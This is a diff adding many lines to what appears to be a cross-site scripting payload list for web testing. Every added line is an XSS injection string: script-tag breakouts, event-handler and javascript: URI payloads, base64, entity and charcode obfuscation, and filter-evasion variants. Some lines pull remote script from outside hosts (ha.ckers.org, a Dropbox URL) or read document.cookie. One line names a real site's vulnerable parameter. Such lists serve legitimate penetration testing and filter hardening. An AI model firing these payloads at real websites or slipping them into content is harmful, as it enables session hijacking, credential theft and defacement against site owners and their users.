@@ -8,3 +8,85 @@
 \"><scRipt>alert('xss')</scRipt>
 javascript:alert(xss)
 <>javascript:alert('XSS')
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
+//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascrscriptipt:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+\";alert('XSS');//
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="width: expression(alert('XSS'));">
+*"-ale rt("OPENBUGBOUNTY")-"a
+flashmediaelement.swf?jsinitfunctio%gn=alert`OPENBUGBOUNTY`
+1<!'/*!"/*\'/*\"/*\/*--></Title/></ScRiPt/><Input/Autofocus/%0D%0A*/Onfocus=confirm(1)//><svg>
+'><marquee/onstart=confirm(1)>
+http://www.aksigorta.com.tr/?s="
+">'>);--><script>alert('XSSPOSED') </script>
+"><img/src=">"onerror=confirm(123)>
+/<\/script><script>alert('OPEN BUGBOUNTY')<\/script>
+<script>alert(1);</script>
+</title><script>alert(/xss/)</script>
+<img src=cmd.jpg onerror=alert(/xssed/) />
+</script><script>alert(1)</script>
+''></title><script>alert(1111)</script>
+</textarea>''><script>alert(document.cookie)</script>
+<svg onload=alert(1)>
+</title></script/"-alert(0)-"-->"><svg /onload=prompt(/OPENBUGBOUNTY/)>
+\"></sCriPt><sCriPt >alert(/CMD/)</sCriPt>
+<video><source onerror="alert(1)">
+<%s%v%g% %o%n%l%o%a%d%=%a%l%e%r%t%(%1%)%>
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+"><svg/onload=prompt(2)>"<input onfocus="alert(1337)"autofocus>
+<svg /on/load=alert(location.hash)>
+"><a onmouseover=prompt(document.domain)>xxs var cmd </a>
+<IMG+"""><SCRIPT>alert("XSS VAR CMD")</SCRIPT>">
+<a onclick="alert(/XSSPOSED/);">/
+<img src="a" onerror='eval(atob("cHJvbXB0KDEpOw=="))'
+<s <onmouseover="alert(1)"> <s onmouseover="alert(1)">This is a test</s>
+<a href="javascriptJ a V a S c R iPt::alert(1)" "<s>">test</a>
+["<s ", " onmouseover='alert(1)'>", "foobar</s>"]
+<code onmouseover=a=eval;b=alert;a(b(/g/.source));>HI</code>
+='){alert('OPENBUGBOUNTY');//"><svg onload=\u0061lert(1)>
+">->'-->"></script><script>alert(4)</script>">
+ '//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+"/></script><script>alert(/CMD/)</script>
+"><svg/onload=alert('CMD')//#
+<img onerror="location='javascript:=lert(1)'" src="x">
+<img onerror="location='javascript:%61lert(1)'" src="x">
+<img onerror="location='javascript:\x2561lert(1)'" src="x">
+<img onerror="location='javascript:\x255Cu0061lert(1)'" src="x" >
+'"--></style></scRipt><scRipt>alert(' XSSPOSED')</scRipt>
+</title></script/"-alert(0)-"--><img/on error=';alert(/XSSPOSED/);'src=1>
+site/1"<%2ftextarea ><svg onlo%61d=(alert)('XSSPOSED') >
+--<svg><scRIPt>confirm('OPENBUGBOUNTY')</sCrIpT>
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+1'"()&%<acx><ScRiPt >prompt(915779)</ScRiPt>
+' "><img src=1 onerror=alert(document.domain)>'
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera} 5) <img/src=`%00` onerror=this.onerror=confirm(1)
+<form><isindex formaction="javascript&colon;confirm(1)"
+<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
+<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+"/></script><script>alert(/CMD/)</script>
+""></script><script>alert(1)</script>
+innerHTML=location.hash>#<script>alert(1)</script>
+"onmouseover="confirm(document.domain);"" "><b onmouseover=alert('Wufff!')>click me!</b><"
+'"><script>alert()</script><input onfocus=write(1) autofocus>
